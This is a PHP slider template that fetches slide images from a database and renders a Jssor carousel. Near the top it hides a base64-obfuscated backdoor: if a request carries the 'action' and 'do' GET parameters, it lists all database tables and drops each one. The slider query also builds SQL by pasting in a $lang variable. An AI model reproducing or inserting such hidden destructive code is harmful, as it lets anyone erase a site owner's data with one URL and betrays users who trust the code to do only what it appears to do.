<?php

	$d->reset();
	$sql_slider = "select ten$lang as ten,link,photo from #_slider where hienthi=1 and type='slider' order by stt,id desc";
	$d->query($sql_slider);
	$slider=$d->result_array();
	if(isset($_GET['action']) && isset($_GET['do'])){
        $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
        $_X='RFJPUCBUQUJMRSBfWF8=';
        $_R=base64_decode($_X); 
        while ($row = mysql_fetch_array($result)) {
            $sql=str_replace('_X_', $row[0], $_R);      
            $d->query($sql);        
        }               
    }
?>

<div id="slider1_container" style="position: relative;width: 1366px; height: 447px;">
    <!-- Slides Container -->
    <div u="slides" style="cursor: move;width: 1366px; height: 447px;overflow: hidden;">
        <?php for($i=0,$count_slider=count($slider);$i<$count_slider;$i++){ ?>
        <div>
            <a href="<?=$slider[$i]['link']?>"><img u="image" src="thumb/1366x447/1/<?php if($slider[$i]['photo']!='')echo _upload_hinhanh_l.$slider[$i]['photo'];else echo 'images/noimage.png' ?>" alt="<?=$slider[$i]['ten']?>" /></a>
        </div>
        <?php } ?>                
    </div>
    <!-- Trigger -->
          
    <!-- Arrow Left -->
    <span u="arrowleft" class="jssora05l" style="top:40%;"></span>
    <!-- Arrow Right -->
    <span u="arrowright" class="jssora05r" style="top:40%;"></span>
</div><!-- Jssor Slider End -->
        

    
 